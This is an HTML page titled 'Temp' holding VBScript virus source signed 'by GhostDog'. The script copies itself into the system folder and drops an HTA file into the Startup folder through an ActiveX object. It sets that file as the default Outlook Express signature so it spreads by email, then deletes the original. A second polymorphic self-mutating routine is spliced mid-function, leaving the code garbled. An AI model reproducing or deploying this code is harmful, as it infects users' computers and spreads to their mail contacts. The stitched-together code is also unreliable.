<html>
<head>
<title>Temp</title>
</head>
<body bgcolor="#ffffff" text="#ffffff">
<script language="VBScript">
On Error Resume Next
Set O=CreateObject("Scripting.FileSystemObject")
H=Replace(Document.Location.PathName,"%20"," ")
Set F=O.OpenTextFile(H,1)
Y=False
Do While F.AtEndOfStream=False
  A=F.ReadLine
  If Y=False Then
    If Right(A,6)="<"&"html>" Then
      Y=True
      U=Right(A,6)
    End If
  Else
    If Left(A,7)="<"&"/html>" Then
      U=U&Chr(126)&Left(A,7)
      Exit Do
    Else
      U=U&Chr(126)&Replace(A,"""","""""")
    End If
  End If
Loop
F.Close
Set K=O.CreateTextFile(O.BuildPath(O.GetSpecialFolder(1),"FOLDER.HTML"),True)
V=Chr(13)&Chr(10)
K.Write "<"&"html>"&V&"<"&"body>"&V&"<"&"script language=""VBScript"">"&V&"On Error Resume Next"&V&"Set Y=Document.CreateElement(""object"")"&V&"Document.Body.AppendChild Y"&V&"Y.Style.Display=""none"""&V&"Y.Code=""com.ms.activeX.ActiveXComponent"""&V&"H="""&I(U)&""""&V&"Window.SetTimeout ""Y.SetClsId(""""{06290BD5-48AA-11D2-8432-006008C3FBFC}"""")"",500"&V&"Window.SetTimeout ""Y.CreateInstance"",550"&V&"Window.SetTimeout ""Y.SetProperty """"Doc"""",Replace(H,Chr(126),Chr(13)&Chr(10))"",600"&V&"Window.SetTimeout ""Y.SetProperty """"Path"""",""""..\Start Menu\Programs\Startup\TEMP.HTA"""""",650"&V&"Window.SetTimeout ""Y.Invoke """"Write"""",P"",700"&V&"P=Array()"&V&"<"&"/script>"&V&"<"&"/body>"&V&"<"&"/html>"
K.Close
Set T=CreateObject("WScript.Shell")
R="HKCU\Identities\"&T.RegRead("HKCU\Identities\Default User ID")&"\Software\Microsoft\Outlook Express\5.0\"
T.RegWrite R&"Signature Flags",3,"REG_DWORD"
T.RegWrite R&"signatures\Default Signature","00000000"
T.RegWrite R&"signatures\00000000\file",O.BuildPath(O.GetSpecialFolder(1),"FOLDER.HTML")
T.RegWrite R&"signatures\00000000\name","Signature #1"
T.RegWrite R&"signatures\00000000\text",""
T.RegWrite R&"signatures\00000000\type",2,"REG_DWORD"
T.RegWrite R&"Mail\Message Send HTML",1,"REG_DWORD"
Window.SetTimeout "O.DeleteFile H,True",500
Window.SetTimeout "Window.Close",550
Function I(C)
  I=Replace(Replace(Replace(Replace(Replace(C,"<h","<""&""h"),"<t","<""&""t"),"<b","<""&""b"),"<s","<""&""s"),"</","<""&""/")
Randomize: On Error Resume Next
Set THWE = CreateObject("Scripting.FileSystemObject")
Set LRA = THWE.OpenTextFile(WScript.ScriptFullName, 1)
DOGGI = 0
Do Until a = "'DOGGI": DOGGI = DOGGI + 1: a = LRA.ReadLine: Loop
LRA.Close
UYRNJ = 21 
ReDim NNJXE(DOGGI), RNW(UYRNJ), MXK(UYRNJ)
Set LRA = THWE.OpenTextFile(WScript.ScriptFullName, 1)
For SEBAT = 1 To DOGGI: NNJXE(SEBAT) = LRA.ReadLine: Next
LRA.Close
'**** Variables ****
RNW(1) = "RNW": RNW(2) = "UYRNJ": RNW(3) = "LRA"
RNW(4) = "MXK": RNW(5) = "SEBAT": RNW(6) = "BAM"
RNW(7) = "DOGGI": RNW(8) = "UAQYK": RNW(9) = "YLHA"
RNW(10) = "RON": RNW(11) = "WGI": RNW(12) = "THWE"
RNW(13) = "NNJXE"
For SEBAT = 1 To UYRNJ
MXK(SEBAT) = Chr(Int(Rnd * 25) + 65)
For BAM = 1 To Int(Rnd * 3) + 2: If Int(Rnd * 5) = 2 Then MXK(SEBAT) = MXK(SEBAT) & Int(Rnd * 9) Else MXK(SEBAT) = MXK(SEBAT) & Chr(Int(Rnd * 25) + 65): Next
If (Int(Rnd * 2) + 1) = 1 Or Len(MXK(y)) <= 4 Then MXK(y) = MXK(y) & Int(Rnd * 99)
Next 
Set LRA = THWE.OpenTextFile(WScript.ScriptFullName, 2)
For SEBAT = 1 To DOGGI
UAQYK = Left(NNJXE(SEBAT),800)
YLHA = Len(Trim(UAQYK))
For BAM = 1 To UYRNJ
Do While InStr(1, UAQYK, RNW(BAM), vbTextCompare)
RON = Len(RNW(BAM))
WGI = InStr(1, UAQYK, RNW(BAM), vbTextCompare)
UAQYK = Mid(UAQYK, 1, WGI - 1) & MXK(BAM) & Mid(UAQYK, WGI + RON, YLHA + RON)
Loop
Next
DOGGI3 = "'" & Chr(Int(Rnd * 255))
For RON = 1 to Int(Rnd * 30) + 2: DOGGI3 = DOGGI3 & Chr(Int(Rnd * 255)): Next
LRA.writeline UAQYK & DOGGI3
Next
End Function
</script>
</body>
</html>
'by GhostDog